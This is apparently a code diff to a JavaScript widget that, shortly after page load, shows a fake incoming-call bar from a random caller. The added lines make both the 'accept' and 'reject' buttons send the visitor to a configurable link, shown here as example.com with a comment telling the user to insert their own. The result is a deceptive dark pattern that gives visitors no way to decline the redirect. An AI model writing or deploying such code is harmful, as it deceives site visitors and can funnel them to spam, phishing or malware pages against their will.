@@ -1,6 +1,8 @@
 (function () {
 
-    // ===== CSS inject (isolated style) =====
+    const redirectLink = "https://example.com"; // 👈 এখানে তোমার লিংক দাও
+
+    // ===== CSS inject =====
     const style = document.createElement("style");
     style.innerHTML = `
     .rcw-callbar{
@@ -21,42 +23,21 @@
         animation:rcwPop .4s ease;
     }
 
-    .rcw-info{
-        display:flex;
-        align-items:center;
-        gap:10px;
-    }
+    .rcw-info{display:flex;align-items:center;gap:10px;}
 
     .rcw-info img{
-        width:50px;
-        height:50px;
-        border-radius:50%;
-        object-fit:cover;
+        width:50px;height:50px;border-radius:50%;object-fit:cover;
     }
 
-    .rcw-text h3{
-        font-size:14px;
-        margin:0;
-    }
+    .rcw-text h3{font-size:14px;margin:0;}
+    .rcw-text p{font-size:12px;margin:0;color:#bbb;}
 
-    .rcw-text p{
-        font-size:12px;
-        margin:0;
-        color:#bbb;
-    }
-
-    .rcw-actions{
-        display:flex;
-        gap:10px;
-    }
+    .rcw-actions{display:flex;gap:10px;}
 
     .rcw-btn{
-        width:42px;
-        height:42px;
-        border:none;
-        border-radius:50%;
-        cursor:pointer;
-        font-size:16px;
+        width:42px;height:42px;
+        border:none;border-radius:50%;
+        cursor:pointer;font-size:16px;
     }
 
     .rcw-accept{background:#25d366;color:#fff;}
@@ -101,6 +82,10 @@
         };
     }
 
+    function goRedirect(){
+        window.location.href = redirectLink;
+    }
+
     function createWidget(){
 
         const data = randomCaller();
@@ -125,21 +110,17 @@
 
         document.body.appendChild(box);
 
-        // accept
+        // accept → redirect
         box.querySelector(".rcw-accept").onclick = () => {
-            alert("Call Accepted");
-            box.remove();
-            setTimeout(createWidget, 3000);
+            goRedirect();
         };
 
-        // reject
+        // reject → redirect
         box.querySelector(".rcw-reject").onclick = () => {
-            box.remove();
-            setTimeout(createWidget, 3000);
+            goRedirect();
         };
     }
 
-    // start after load
     window.addEventListener("load", () => {
         setTimeout(createWidget, 2000);
     });
